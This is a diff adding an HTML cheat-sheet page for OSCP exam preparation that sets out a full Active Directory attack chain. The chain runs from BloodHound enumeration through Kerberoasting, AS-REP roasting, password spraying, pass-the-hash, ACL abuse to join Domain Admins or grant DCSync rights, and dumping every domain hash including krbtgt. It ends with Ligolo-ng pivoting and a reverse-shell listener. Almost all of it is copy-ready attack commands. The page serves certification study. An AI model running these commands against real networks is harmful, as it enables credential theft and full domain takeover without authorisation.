@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Active Directory | Psalm OSCP</title>
+  <style>
+    :root {
+      --bg: #0a0e1a;
+      --bg2: #0d1117;
+      --card: #161b22;
+      --code-bg: #10151e;
+      --border: #21262d;
+      --border2: #30363d;
+      --text: #e6edf3;
+      --muted: #8b949e;
+      --dim: #6e7681;
+      --accent: #58a6ff;
+      --green: #3fb950;
+      --yellow: #d29922;
+      --red: #f85149;
+      --purple: #bc8cff;
+      --mono: 'Courier New', Courier, monospace;
+      --sans: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); font-size: 15px; line-height: 1.6; }
+    a { color: var(--accent); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+
+    /* NAV */
+    .top-nav { display: flex; align-items: center; justify-content: space-between; padding: 0.85rem 2rem; background: var(--bg2); border-bottom: 1px solid var(--border); position: sticky; top: 0; z-index: 100; }
+    .logo { font-family: var(--mono); font-size: 1.05rem; color: var(--accent); font-weight: 700; }
+    .back-link { font-size: 0.82rem; color: var(--muted); border: 1px solid var(--border2); padding: 4px 12px; border-radius: 6px; transition: all 0.2s; }
+    .back-link:hover { background: var(--card); color: var(--text); text-decoration: none; }
+
+    /* LAYOUT */
+    .page { display: flex; max-width: 1380px; margin: 0 auto; }
+
+    /* SIDEBAR */
+    .sidebar { width: 230px; flex-shrink: 0; padding: 2rem 1rem 2rem 1.5rem; position: sticky; top: 54px; height: calc(100vh - 54px); overflow-y: auto; border-right: 1px solid var(--border); }
+    .sidebar-label { font-size: 0.68rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--dim); margin-bottom: 0.6rem; padding-bottom: 0.3rem; border-bottom: 1px solid var(--border); }
+    .sidebar ul { list-style: none; }
+    .sidebar li { margin-bottom: 1px; }
+    .sidebar li a { display: block; font-size: 0.8rem; color: var(--muted); padding: 4px 8px; border-radius: 4px; font-family: var(--mono); transition: all 0.15s; }
+    .sidebar li a:hover { background: var(--card); color: var(--accent); text-decoration: none; }
+    .sidebar-group { margin-top: 1.1rem; }
+    .sidebar-group-lbl { font-size: 0.65rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--dim); padding: 2px 8px; margin-bottom: 2px; display: block; }
+
+    /* MAIN */
+    .main { flex: 1; padding: 2rem 2.5rem 5rem; min-width: 0; }
+    .page-title { font-size: 1.9rem; font-weight: 700; margin-bottom: 0.4rem; }
+    .page-sub { color: var(--muted); font-size: 0.9rem; margin-bottom: 2.5rem; }
+
+    /* SECTIONS */
+    .sec { margin-bottom: 3rem; }
+    .sec-head { display: flex; align-items: center; gap: 10px; margin-bottom: 1.2rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+    .sec-head h2 { font-size: 1.2rem; font-weight: 600; }
+
+    /* CODE BLOCKS */
+    .cb { margin: 0.75rem 0; border: 1px solid var(--border2); border-radius: 8px; overflow: hidden; }
+    .cb-head { display: flex; align-items: center; justify-content: space-between; padding: 5px 13px; background: var(--card); border-bottom: 1px solid var(--border); gap: 8px; flex-wrap: wrap; }
+    .cb-lbl { font-size: 0.73rem; font-family: var(--mono); color: var(--muted); }
+    .cb-tags { display: flex; gap: 5px; margin-left: auto; }
+    .tag { font-size: 0.65rem; padding: 1px 7px; border-radius: 4px; font-family: var(--mono); border: 1px solid var(--border2); color: var(--dim); }
+    .t-your { border-color: #d2992255; color: var(--yellow); background: #d2992212; }
+    .t-crit { border-color: #f8514955; color: var(--red); background: #f8514912; }
+    .t-win  { border-color: #58a6ff55; color: var(--accent); background: #58a6ff12; }
+    .t-lin  { border-color: #3fb95055; color: var(--green); background: #3fb95012; }
+    .t-ad   { border-color: #bc8cff55; color: var(--purple); background: #bc8cff12; }
+    .cpb { font-size: 0.68rem; padding: 2px 9px; background: transparent; border: 1px solid var(--border2); border-radius: 4px; color: var(--dim); cursor: pointer; font-family: var(--mono); white-space: nowrap; transition: all 0.15s; }
+    .cpb:hover { background: var(--code-bg); color: var(--muted); }
+    pre { background: var(--code-bg); padding: 12px 15px; font-family: var(--mono); font-size: 0.8rem; line-height: 1.85; overflow-x: auto; color: var(--text); white-space: pre; }
+    .c  { color: var(--dim); }
+    .h  { color: var(--green); }
+    .w  { color: var(--yellow); }
+    .e  { color: var(--red); }
+
+    /* CALLOUTS */
+    .note  { padding: 9px 13px; border-radius: 6px; margin: 0.6rem 0; font-size: 0.83rem; line-height: 1.6; font-family: var(--mono); }
+    .n-info  { background: #1f6feb14; border: 1px solid #1f6feb44; color: #58a6ff; }
+    .n-warn  { background: #d2992214; border: 1px solid #d2992244; color: var(--yellow); }
+    .n-bad   { background: #f8514914; border: 1px solid #f8514944; color: var(--red); }
+    .n-good  { background: #3fb95014; border: 1px solid #3fb95044; color: var(--green); }
+
+    /* SIGNAL BOX */
+    .sig { background: var(--code-bg); border: 1px solid var(--border2); border-left: 3px solid var(--yellow); border-radius: 6px; padding: 11px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.95; }
+    .sig-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--yellow); margin-bottom: 7px; display: block; }
+    .so { color: var(--muted); }
+    .sa { color: var(--green); }
+
+    /* GRID */
+    .two { display: grid; grid-template-columns: 1fr 1fr; gap: 0.9rem; }
+    @media(max-width:880px) { .sidebar{display:none;} .main{padding:1.2rem;} .two{grid-template-columns:1fr;} }
+
+    /* FOOTER */
+    footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
+
+    /* COPY JS */
+  </style>
+  <script>
+    function cp(btn) {
+      const pre = btn.closest('.cb').querySelector('pre');
+      const text = pre.innerText;
+      navigator.clipboard.writeText(text).then(() => {
+        const o = btn.textContent; btn.textContent = '✓ copied';
+        setTimeout(() => btn.textContent = o, 1500);
+      });
+    }
+  </script>
+</head><body>
+<nav class="top-nav">
+  <a class="logo" href="https://difficultsnow.github.io/PT-toolkit-main/index.html">&lt;DifficultSnow/&gt;</a>
+  <a class="back-link" href="index.html">← Psalm OSCP Methodology</a>
+</nav>
+<div class="page">
+  <aside class="sidebar">
+    <div class="sidebar-label">On This Page</div>
+    <ul>
+      <li><a href="#p0">Phase 0: BloodHound</a></li>
+      <li><a href="#p1">Phase 1: Enum</a></li>
+      <li><a href="#p2">Phase 2: Kerberoasting</a></li>
+      <li><a href="#p3">Phase 3: AS-REP Roasting</a></li>
+      <li><a href="#p4">Phase 4: Password Spray</a></li>
+      <li><a href="#p5">Phase 5: Lateral Movement</a></li>
+      <li><a href="#p6">Phase 6: ACL Abuse</a></li>
+      <li><a href="#p7">Phase 7: DCSync + Proof</a></li>
+      <li><a href="#pivot">Pivoting — Ligolo-ng</a></li>
+    </ul>
+  </aside>
+  <main class="main">
+    <h1 class="page-title">🏛️ Active Directory</h1>
+    <p class="page-sub">Assumed-breach: you receive creds. Start BloodHound immediately — it maps your entire kill chain. AD set = 40pts. Attack it first.</p>
+    <div class="note n-bad">AD set is all-or-nothing for Domain Admin. Partial credit exists for early foothold steps but DA = full 40pts. Prioritize this above everything.</div>
+
+    <section class="sec" id="p0">
+      <div class="sec-head"><h2>Phase 0 — BloodHound (Run Immediately)</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">ingest with given creds</span><div class="cb-tags"><span class="tag t-ad">first action</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>bloodhound-python -u &lt;user&gt; -p '&lt;pass&gt;' -d &lt;domain&gt; -ns &lt;DC_IP&gt; -c All --zip -o ~/exam/loot/
+<span class="c"># With hash:</span>
+bloodhound-python -u &lt;user&gt; --hashes ':&lt;NThash&gt;' -d &lt;domain&gt; -ns &lt;DC_IP&gt; -c All --zip
+
+<span class="c"># Upload zip to BloodHound GUI. Run these queries first:</span>
+<span class="c"># "Find All Domain Admins"</span>
+<span class="c"># "Shortest Paths to Domain Admins from Owned Principals"</span>
+<span class="c"># "Find Principals with DCSync Rights"</span>
+<span class="c"># "Find Kerberoastable Users"</span>
+<span class="c"># "Find AS-REP Roastable Users"</span>
+<span class="c"># "Find Computers with Unconstrained Delegation"</span></pre></div>
+    </section>
+
+    <section class="sec" id="p1">
+      <div class="sec-head"><h2>Phase 1 — Enumeration</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">users, groups, shares, policy</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --users
+crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --groups
+crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --pass-pol  <span class="c"># lockout threshold!</span>
+crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -p '&lt;pass&gt;' --shares
+rpcclient -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" &lt;DC_IP&gt; -c "enumdomusers;querydispinfo"
+impacket-GetADUsers -all &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt;</pre></div>
+    </section>
+
+    <section class="sec" id="p2">
+      <div class="sec-head"><h2>Phase 2 — Kerberoasting</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">request TGS hashes + crack</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt; -request -outputfile ~/exam/loot/kerberoast.hashes
+<span class="c"># With hash:</span>
+impacket-GetUserSPNs &lt;domain&gt;/&lt;user&gt; -hashes ':&lt;NThash&gt;' -dc-ip &lt;DC_IP&gt; -request -outputfile ~/exam/loot/kerberoast.hashes
+
+hashcat -m 13100 ~/exam/loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force
+hashcat -m 13100 ~/exam/loot/kerberoast.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+john --wordlist=/usr/share/wordlists/rockyou.txt ~/exam/loot/kerberoast.hashes</pre></div>
+    </section>
+
+    <section class="sec" id="p3">
+      <div class="sec-head"><h2>Phase 3 — AS-REP Roasting</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">find no-preauth accounts + crack</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># With creds:</span>
+impacket-GetNPUsers &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;' -dc-ip &lt;DC_IP&gt; -request -format hashcat -outputfile ~/exam/loot/asrep.hashes
+<span class="c"># Without creds (need username list):</span>
+impacket-GetNPUsers &lt;domain&gt;/ -usersfile ~/exam/loot/users.txt -dc-ip &lt;DC_IP&gt; -no-pass -format hashcat -outputfile ~/exam/loot/asrep.hashes
+
+hashcat -m 18200 ~/exam/loot/asrep.hashes /usr/share/wordlists/rockyou.txt --force</pre></div>
+    </section>
+
+    <section class="sec" id="p4">
+      <div class="sec-head"><h2>Phase 4 — Password Spray</h2></div>
+      <div class="note n-bad">Check lockout threshold FIRST. Spray max threshold-2 passwords per round. Wait 30min between rounds.</div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">spray safely</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># Get password policy first:</span>
+crackmapexec smb &lt;DC_IP&gt; -u &lt;user&gt; -p '&lt;pass&gt;' --pass-pol
+<span class="c"># lockoutThreshold: 5 → spray max 3 passwords per round</span>
+
+kerbrute passwordspray -d &lt;domain&gt; --dc &lt;DC_IP&gt; ~/exam/loot/users.txt 'Password123!'
+kerbrute passwordspray -d &lt;domain&gt; --dc &lt;DC_IP&gt; ~/exam/loot/users.txt 'Welcome2024!'
+kerbrute passwordspray -d &lt;domain&gt; --dc &lt;DC_IP&gt; ~/exam/loot/users.txt 'Summer2024!'
+crackmapexec smb &lt;DC_IP&gt; -u ~/exam/loot/users.txt -p 'Password123!' --continue-on-success
+<span class="c"># "Pwn3d!" in CME output = local admin on that host</span></pre></div>
+    </section>
+
+    <section class="sec" id="p5">
+      <div class="sec-head"><h2>Phase 5 — Lateral Movement</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">pass-the-hash — all methods</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>impacket-psexec &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; -hashes ':&lt;NThash&gt;'     <span class="c"># SYSTEM shell</span>
+impacket-wmiexec &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; -hashes ':&lt;NThash&gt;'   <span class="c"># no service drop</span>
+impacket-smbexec &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; -hashes ':&lt;NThash&gt;'   <span class="c"># service-based</span>
+evil-winrm -i &lt;IP&gt; -u &lt;user&gt; -H &lt;NThash&gt;                     <span class="c"># best interactive</span>
+crackmapexec smb &lt;subnet&gt;/24 -u &lt;user&gt; -H &lt;NThash&gt; --continue-on-success</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">secretsdump — after pwning a host</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>impacket-secretsdump &lt;domain&gt;/&lt;user&gt;:'&lt;pass&gt;'@&lt;IP&gt;
+impacket-secretsdump &lt;domain&gt;/&lt;user&gt;@&lt;IP&gt; -hashes ':&lt;NThash&gt;'
+impacket-secretsdump -sam sam.bak -system system.bak LOCAL   <span class="c"># offline parse</span></pre></div>
+    </section>
+
+    <section class="sec" id="p6">
+      <div class="sec-head"><h2>Phase 6 — ACL Abuse (from BloodHound paths)</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">GenericAll on user — reset password</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>net rpc password &lt;targetuser&gt; 'NewP@ss123!' -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt;</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">GenericAll on group — add self to Domain Admins</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>net rpc group addmem "Domain Admins" &lt;youruser&gt; -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt;
+<span class="c"># Verify:</span>
+net rpc group members "Domain Admins" -U "&lt;domain&gt;/&lt;user&gt;%&lt;pass&gt;" -S &lt;DC_IP&gt;</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">WriteDACL — grant yourself DCSync rights</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># PowerView on victim:</span>
+$cred = New-Object System.Management.Automation.PSCredential('&lt;domain&gt;\&lt;user&gt;', (ConvertTo-SecureString '&lt;pass&gt;' -AsPlainText -Force))
+Add-DomainObjectAcl -TargetIdentity "&lt;domain&gt;" -PrincipalIdentity &lt;youruser&gt; -Rights DCSync -Credential $cred
+<span class="c"># Then DCSync from kali:</span>
+impacket-secretsdump &lt;domain&gt;/&lt;youruser&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; -just-dc-ntlm</pre></div>
+    </section>
+
+    <section class="sec" id="p7">
+      <div class="sec-head"><h2>Phase 7 — DCSync + Proof</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">dump all domain hashes</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>impacket-secretsdump &lt;domain&gt;/&lt;DA&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; -just-dc-ntlm
+impacket-secretsdump &lt;domain&gt;/&lt;DA&gt;@&lt;DC_IP&gt; -hashes ':&lt;NThash&gt;' -just-dc-ntlm
+<span class="c"># Get krbtgt for Golden Ticket:</span>
+impacket-secretsdump &lt;domain&gt;/&lt;DA&gt;:'&lt;pass&gt;'@&lt;DC_IP&gt; -just-dc-user krbtgt</pre></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">proof screenshot — run as DA on DC</span><div class="cb-tags"><span class="tag t-crit">required</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre>whoami /all &amp;&amp; hostname &amp;&amp; ipconfig /all
+type C:\Users\Administrator\Desktop\proof.txt
+<span class="c"># Screenshot: terminal showing all above + proof.txt in ONE window</span></pre></div>
+    </section>
+
+    <section class="sec" id="pivot">
+      <div class="sec-head"><h2>Pivoting — Ligolo-ng</h2></div>
+      <div class="cb"><div class="cb-head"><span class="cb-lbl">full setup</span><button class="cpb" onclick="cp(this)">copy</button></div>
+        <pre><span class="c"># KALI — one-time interface setup:</span>
+sudo ip tuntap add user $USER mode tun ligolo
+sudo ip link set ligolo up
+./proxy -selfcert -laddr 0.0.0.0:11601
+
+<span class="c"># PIVOT HOST (victim with access to internal net):</span>
+./agent -connect &lt;KALI_IP&gt;:11601 -ignore-cert          <span class="c"># Linux</span>
+.\agent.exe -connect &lt;KALI_IP&gt;:11601 -ignore-cert      <span class="c"># Windows</span>
+
+<span class="c"># In proxy console:</span>
+session   <span class="c"># pick session number</span>
+start     <span class="c"># start tunnel</span>
+
+<span class="c"># Add route on kali:</span>
+sudo ip route add 172.16.1.0/24 dev ligolo
+ping 172.16.1.10   <span class="c"># verify tunnel works</span>
+
+<span class="c"># Expose listener for reverse shells from internal hosts:</span>
+listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444</pre></div>
+    </section>
+
+  </main>
+</div>
+<footer>&lt;DifficultSnow/&gt; | Psalm OSCP Methodology</footer>
+</body></html>
